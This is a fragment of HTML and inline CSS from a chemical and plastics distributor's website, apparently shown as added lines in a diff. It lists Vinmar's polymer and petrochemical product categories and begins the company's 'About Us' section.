0px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-prefix {}div.fl-node-w049ze8huqds .pp-heading-content {text-align: ;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading .heading-title span.title-text {display: inline;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading .heading-title span.pp-primary-title {color: rgb(0, 0, 0);display: inline;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading .heading-title:hover span.pp-primary-title {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading .heading-title span.pp-secondary-title {display: inline;margin-left: 0px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading .heading-title:hover span.pp-secondary-title {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading.pp-separator--inline,div.fl-node-w049ze8huqds .pp-heading-content .pp-heading:not(.pp-separator--inline) .heading-title {margin-top: 10px;margin-bottom: 10px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-primary-title,div.fl-node-w049ze8huqds .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-secondary-title {display: inline-block;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading .pp-heading-link {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:before {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading.pp-separator--inline .pp-heading-separator span {width: 100px;border-bottom-style: solid;border-bottom-width: 1px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-sub-heading {margin-top: 0px;margin-bottom: 0px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-sub-heading,div.fl-node-w049ze8huqds .pp-heading-content .pp-sub-heading p {color: rgb(0, 0, 0);}div.fl-node-w049ze8huqds .pp-heading-content .pp-sub-heading p:last-of-type {margin-bottom: 0;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-heading-separator-align {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.line_with_icon {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.line_with_icon:before {margin-right: 20px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.line_with_icon:after {margin-left: 20px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.line_with_icon.pp-left:after {left: 1%;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.line_with_icon.pp-right:before {right: 1%;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.line_with_icon:before,div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.line_with_icon:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .heading-icon-image {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-separator-line {border-bottom-style: solid;border-bottom-width: 1px;width: 100px;margin: 0 auto;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator:not(.inline) {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {display: inline-block;text-align: center;border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i,div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i:before {font-size: 16px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.icon_only span {border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.icon_only img,div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.line_with_icon img {border-radius: 100px;}@media only screen and (max-width: 992px) {div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-w049ze8huqds .pp-heading-content {text-align: ;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-prefix {}}@media only screen and (max-width: 768px) {div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-w049ze8huqds .pp-heading-content {text-align: ;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-prefix {}}div.fl-node-w049ze8huqds div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-w049ze8huqds div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:last-of-type {padding-left: 20px;}div.fl-node-w049ze8huqds div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-w049ze8huqds div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:first-of-type {padding-right: 20px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-w049ze8huqds .pp-heading-content .pp-heading-separator.icon_only span {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-prefix {}div.fl-node-8ducre3akzmx .pp-heading-content {text-align: ;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading .heading-title span.title-text {display: inline;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading .heading-title span.pp-primary-title {color: rgb(0, 0, 0);display: inline;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading .heading-title:hover span.pp-primary-title {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading .heading-title span.pp-secondary-title {display: inline;margin-left: 0px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading .heading-title:hover span.pp-secondary-title {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading.pp-separator--inline,div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading:not(.pp-separator--inline) .heading-title {margin-top: 10px;margin-bottom: 10px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-primary-title,div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading .heading-title.text-inline-block span.pp-secondary-title {display: inline-block;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading .pp-heading-link {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:before {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading.pp-separator-inline .heading-title span:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading.pp-separator--inline .pp-heading-separator span {width: 100px;border-bottom-style: solid;border-bottom-width: 1px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-sub-heading {margin-top: 0px;margin-bottom: 0px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-sub-heading,div.fl-node-8ducre3akzmx .pp-heading-content .pp-sub-heading p {color: rgb(0, 0, 0);}div.fl-node-8ducre3akzmx .pp-heading-content .pp-sub-heading p:last-of-type {margin-bottom: 0;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-heading-separator-align {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.line_with_icon {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.line_with_icon:before {margin-right: 20px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.line_with_icon:after {margin-left: 20px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.line_with_icon.pp-left:after {left: 1%;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.line_with_icon.pp-right:before {right: 1%;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.line_with_icon:before,div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.line_with_icon:after {width: 100px;border-style: solid;border-bottom-width: 1px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .heading-icon-image {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-separator-line {border-bottom-style: solid;border-bottom-width: 1px;width: 100px;margin: 0 auto;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator:not(.inline) {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {display: inline-block;text-align: center;border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i,div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-heading-separator-icon i:before {font-size: 16px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.icon_only span {border-radius: 100px;border-width: 0px;border-style: none;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.icon_only img,div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.line_with_icon img {border-radius: 100px;}@media only screen and (max-width: 992px) {div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-8ducre3akzmx .pp-heading-content {text-align: ;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-prefix {}}@media only screen and (max-width: 768px) {div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-heading-separator-align,div.fl-node-8ducre3akzmx .pp-heading-content {text-align: ;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-separator-line {}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-prefix {}}div.fl-node-8ducre3akzmx div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-8ducre3akzmx div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:last-of-type {padding-left: 20px;}div.fl-node-8ducre3akzmx div.pp-heading-content .pp-heading.pp-separator-inline .heading-title span, div.fl-node-8ducre3akzmx div.pp-heading-content .pp-heading.pp-separator--inline > .pp-heading-separator:first-of-type {padding-right: 20px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator .pp-heading-separator-icon {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}div.fl-node-8ducre3akzmx .pp-heading-content .pp-heading-separator.icon_only span {padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}.fl-builder-content[data-type="header"].bb-powerpack-header-sticky {left: 0;position: fixed;right: 0;top: 0;width: 100%;z-index: 100;}.admin-bar .fl-builder-content[data-type="header"].bb-powerpack-header-sticky {top: 32px;}.fl-builder-content[data-shrink="1"] .fl-row-content-wrap,.fl-builder-content[data-shrink="1"] .fl-col-content,.fl-builder-content[data-shrink="1"] .fl-module-content,.fl-builder-content[data-shrink="1"] img {-webkit-transition: all 0.3s ease-in-out, background-position 1ms;-moz-transition: all 0.3s ease-in-out, background-position 1ms;transition: all 0.3s ease-in-out, background-position 1ms;}.fl-builder-content[data-shrink="1"] img {width: auto;}.fl-builder-content[data-type="header"].bb-powerpack-header-shrink .fl-row-content-wrap {margin-bottom: 0;margin-top: 0;}.bb-powerpack-header-shrink-row-bottom.fl-row-content-wrap {padding-bottom: 5px;}.bb-powerpack-header-shrink-row-top.fl-row-content-wrap {padding-top: 5px;}.fl-builder-content[data-type="header"].bb-powerpack-header-shrink .fl-col-content {margin-bottom: 0;margin-top: 0;padding-bottom: 0;padding-top: 0;}.bb-powerpack-header-shrink-module-bottom.fl-module-content {margin-bottom: 5px;}.bb-powerpack-header-shrink-module-top.fl-module-content {margin-top: 5px;}.fl-builder-content[data-type="header"].bb-powerpack-header-shrink img {max-height: 50px;}.fl-builder-content[data-overlay="1"]:not(.bb-powerpack-header-sticky) {position: absolute;width: 100%;z-index: 100;}.fl-builder-edit body:not(.single-fl-theme-layout):not(.bb-powerpack-header-edit) .fl-builder-content[data-overlay="1"] {display: none;}body:not(.single-fl-theme-layout):not(.fl-builder-edit) .fl-builder-content[data-overlay="1"]:not(.bb-powerpack-header-scrolled):not([data-overlay-bg="default"]) .fl-row-content-wrap,body:not(.single-fl-theme-layout):not(.fl-builder-edit) .fl-builder-content[data-overlay="1"]:not(.bb-powerpack-header-scrolled):not([data-overlay-bg="default"]) .fl-col-content {background: transparent;}
+/*# sourceURL=fl-builder-layout-89-inline-css */
+</style>
+<div class="fl-builder-content fl-builder-content-89 fl-builder-template fl-builder-layout-template fl-builder-global-templates-locked" data-post-id="89"><div  class="fl-module fl-module-box fl-node-vh4t65zrjklm" data-node="vh4t65zrjklm" aria-label="Box">
+	<div class="fl-module fl-module-pp-heading fl-node-xb8nark7jdp2" data-node="xb8nark7jdp2" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Polyethylene (PE)</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Low Density Polyethylene</li><li>Linear Low Density Polyethylene</li><li>High Molecular Weight Polyethylene</li><li>High Density Polyethylene</li><li>Metallocenes</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-xnbceitf3m54" data-node="xnbceitf3m54" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Polypropylene (PP)</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Homopolymers</li><li>Copolymers</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-dafey5tu81qk" data-node="dafey5tu81qk" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Polyvinyl Chloride (PVC)</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Suspension</li><li>Emulsion</li><li>C-PVC</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-9dbn8axq32jt" data-node="9dbn8axq32jt" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Polyethylene Terephthalate (PET)</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Bottle grade</li><li>Sheet grade</li><li>Fiber grade</li><li>Recycled PET</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-w049ze8huqds" data-node="w049ze8huqds" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Styrenics</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>General Purpose Polystyrene (GPPS)</li><li>High Impact Polystyrene (HIPS)</li><li>Expandable Polystyrene (EPS)</li><li>Acrylonitrile Butadiene Styrene (ABS)</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-8ducre3akzmx" data-node="8ducre3akzmx" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Rubbers</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Butyl Rubber (BR)</li><li>Styrene Butadiene Rubber (SBR)</li><li>Polybutadiene Rubber (PBR)</li><li>Ethylene Propylene Diene Monomer (EPDM)</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+	</div>
+</div></p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="pp-modal-overlay"></div>
+</div>
+	</div>
+</div>
+	</div>
+<style>.fl-node-sxf8l0k3ypr7.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+<div  class="fl-module fl-module-box fl-node-ry2vlk7e8mox" data-node="ry2vlk7e8mox" aria-label="Box">
+	<div  class="fl-module fl-module-html fl-html fl-node-tw734j52nh9q blendmode-multiply" data-node="tw734j52nh9q" aria-label="HTML">
+	<?xml version="1.0" encoding="UTF-8"?><svg id="a" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 510 1020"><defs><style>.b{fill:none;stroke:#fff;stroke-miterlimit:10;stroke-width:2px;}.c{fill:#00664f;}</style></defs><path class="c" d="M510,1017C229.99,1017,3,790.01,3,510S229.99,3,510,3v1014Z"/><path class="b" d="M510,1017C229.99,1017,3,790.01,3,510S229.99,3,510,3"/></svg></div>
+<div  class="fl-module fl-module-box fl-node-u2flc7tdx1g0 fl-animation fl-fade-up" data-node="u2flc7tdx1g0" data-animation-delay="0" data-animation-duration="1" aria-label="Box">
+	<div class="fl-module fl-module-pp-heading fl-node-uza6t3m1dw4i" data-node="uza6t3m1dw4i" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-left">
+		
+		<h5 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Chemicals</span>
+
+			
+			
+		</h5>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<p>Vinmar delivers a comprehensive range of petrochemicals, backed by expert guidance in logistics, financing, and compliance.</p>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-modal-box fl-node-861fi2surv9a" data-node="861fi2surv9a" aria-label="Modal Box">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-modal-button">
+	<a href="#" id="trigger-861fi2surv9a" class="pp-modal-trigger modal-861fi2surv9a" role="button" data-modal="861fi2surv9a" data-node="861fi2surv9a">
+									<span class="pp-modal-trigger-text">View Chemicals</span>
+							<span class="pp-button-icon pp-button-icon-after fas fa-arrow-circle-right"></span>
+												</a>
+</div>
+<div id="modal-861fi2surv9a" class="pp-modal-wrap has-overlay-animation" role="dialog">
+	<div class="pp-modal-container">
+				<div class="pp-modal layout-fullscreen">
+						<div class="pp-modal-body">
+															<div class="pp-modal-close box-top-right no-modal-header" role="button" tabindex="0" aria-label="Close">
+							<div class="bar-wrap" aria-hidden="true">
+								<span class="bar-1"></span>
+								<span class="bar-2"></span>
+							</div>
+						</div>
+																	<div class="pp-modal-content">
+					<div class="pp-modal-content-inner">
+						<p><link rel='stylesheet' id='fl-builder-layout-95-css' href='https://www.vinmar.com/wp-content/uploads/bb-plugin/cache/95-layout-partial.css?ver=39704adb165daabad25ba787b0d0fd09' media='all' />
+<div class="fl-builder-content fl-builder-content-95 fl-builder-template fl-builder-layout-template fl-builder-global-templates-locked" data-post-id="95"><div  class="fl-module fl-module-box fl-node-bryxdfc5ta3e" data-node="bryxdfc5ta3e" aria-label="Box">
+	<div class="fl-module fl-module-pp-heading fl-node-6dk3mnirc0by" data-node="6dk3mnirc0by" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Alcohols</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Ethanol</li><li>Methanol</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-qj25bp6e9rnf" data-node="qj25bp6e9rnf" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Anhydrides</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Phthalic Anhydride</li><li>Maleic Anhydride</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-mn0wb7soaxqr" data-node="mn0wb7soaxqr" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Aromatics</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Benzene</li><li>Cumene</li><li>Cyclohexane</li><li>Mixed-Xylenes</li><li>Ortho-Xylenes</li><li>Para-Xylenes</li><li>Pygas</li><li>Styrene</li><li>Toluene</li><li>Meta-Xylene</li><li>Aromatic C-9</li><li>Aromatic C-9+</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-thwqzryi6s2u" data-node="thwqzryi6s2u" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Chemical Gases</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Butadiene</li><li>Butene-1</li><li>Crude C-4's</li><li>Ethylene</li><li>Propylene</li><li>Vinyl Chloride Monomer</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-g70xmtpz8yqn" data-node="g70xmtpz8yqn" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Chloralkali Chemicals</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Ethylene Dichloride</li><li>Caustic Soda</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-s4itg97bxj2p" data-node="s4itg97bxj2p" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Fibre Intermediates</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Acrylonitrile</li><li>Caprolactam</li><li>Diethylene Glycol</li><li>Dimethyl Terephthalate</li><li>Monoethylene Glycol</li><li>Terephthalic Acid</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-4wik1r2gdcl5" data-node="4wik1r2gdcl5" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Natural Gas Liquids</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Ethane</li><li>Propane</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-difp1r2wskbx" data-node="difp1r2wskbx" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Oxo-Alcohols</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>2 Ethyl Hexanol</li><li>Iso Butyl Alcohol</li><li>N Butanol</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-w4exlnhyir8t" data-node="w4exlnhyir8t" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Plasticizers</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Diisodecyl Phthalate</li><li>Diisononyl Phthalate</li><li>Dioctyl Phthalate</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-x1d24avkilb9" data-node="x1d24avkilb9" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Solvents</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Acetates</li><li>Acetone</li><li>Glycol Ethers</li><li>Methyl Ethyl Ketone</li><li>Isopropyl Alcohol</li><li>Methyl Isobutyl Ketone (MIBK)</li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+<div class="fl-module fl-module-pp-heading fl-node-hrqs2z8j1mby" data-node="hrqs2z8j1mby" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Others</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<ul><li>Acetic Acid</li><li>Acrylates</li><li>Adipic Acid</li><li>Alpha Olefins</li><li>Alphamethyl Styrene</li><li>Aniline</li><li>Bisphenol-A</li><li>Cyclohexanone</li><li>Ethanolamines (MEA &amp; DEA)</li><li>Hexane</li><li>Isocyanates (MDI &amp; TDI)</li><li>Nitric Acid</li><li>N Methyl Aniline (NMA, Octane Booster)</li><li>Phenol</li><li>Polyols</li><li>Propylene Glycol</li><li>Titanium Dioxide</li><li>Triethylene glycol</li><li>Vinyl Acetate Monomer</li><li>2-Ethyl Hexyl Nitrate (2-EHN, Cetane Booster)</li><li>Raffinates:<ul><li>Ethane</li><li>Ethylene</li><li>Propylene</li><li>Crude C4</li><li>Butadiene</li><li>Raffinate 1</li><li>Isobutylene</li><li>Raffinate 2</li><li>Butene 1</li></ul></li></ul>		</div>
+	
+	</div>
+	</div>
+</div>
+	</div>
+</div></p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="pp-modal-overlay"></div>
+</div>
+	</div>
+</div>
+	</div>
+<style>.fl-node-u2flc7tdx1g0.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+	</div>
+</div>
+</div>
+	</div>
+		</div>
+	</div>
+</div>
+<div id="about-us" class="fl-row fl-row-full-width fl-row-bg-none fl-node-wxqedh45opsf fl-row-default-height fl-row-align-center" data-node="wxqedh45opsf">
+	<div class="fl-row-content-wrap">
+						<div class="fl-row-content fl-row-fixed-width fl-node-content">
+		
+<div class="fl-col-group fl-node-ewb7qrsazl0p" data-node="ewb7qrsazl0p">
+			<div class="fl-col fl-node-ycq8ewspdtxr fl-col-bg-color" data-node="ycq8ewspdtxr">
+	<div class="fl-col-content fl-node-content"><div  class="fl-module fl-module-box fl-node-1a697mwkcbux" data-node="1a697mwkcbux" aria-label="Box">
+	<h2  class="fl-module fl-module-heading fl-heading fl-heading-text fl-node-n7zx8swidv24 fl-animation fl-fade-up" data-node="n7zx8swidv24" data-animation-delay="0" data-animation-duration="1" aria-label="Heading">
+			About Us	</h2>
+<style>.fl-node-n7zx8swidv24.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+<div  class="fl-module fl-module-box fl-node-8pdax5be4rzj fl-animation fl-fade-up" data-node="8pdax5be4rzj" data-animation-delay="0" data-animation-duration="1" aria-label="Box">
+	<div  class="fl-module fl-module-box fl-node-9cjowpebqfi7" data-node="9cjowpebqfi7" aria-label="Box">
+	<div  class="fl-module fl-module-box fl-node-dezahwkyfxpl" data-node="dezahwkyfxpl" aria-label="Box">
+	<div  class="fl-module fl-module-rich-text fl-rich-text fl-node-2vmrqctf0149" data-node="2vmrqctf0149" aria-label="Text Editor">
+	<p>Vinmar is a global marketing and distribution company that brings value to the world’s leading producers and users of plastics and chemicals through the supply of best in class products and tailored business solutions.</p>
+<p>With over 48 years of experience and success, Vinmar has grown into one of the world’s largest plastics and chemicals marketing and distribution companies. The company has over 58 offices in more than 36 countries with sales in excess of 110 countries.</p>
+</div>
+<div  class="fl-module fl-module-rich-text fl-rich-text fl-node-qsmu2r3xtzke" data-node="qsmu2r3xtzke" aria-label="Text Editor">
+	<p>Vinmar has over 58 offices in over 36 nations with sales in excess of 110 countries.</p>
+</div>
+<div  class="fl-module fl-module-rich-text fl-rich-text fl-node-pvasmdh1j7lf" data-node="pvasmdh1j7lf" aria-label="Text Editor">
+	<p>We have a truly global commercial footprint while providing our customers and partners the local intimacy they require and value. At the core of our business is our strict adherence to compliance standards and Vinmar’s business ethics and code of conduct policy.</p>
+</div>
+	</div>
+<div class="fl-module fl-module-pp-pullquote fl-node-qn4uyrt019g3 fl-animation fl-slide-in-right" data-node="qn4uyrt019g3" data-animation-delay="0" data-animation-duration="1" aria-label="Pullquote">
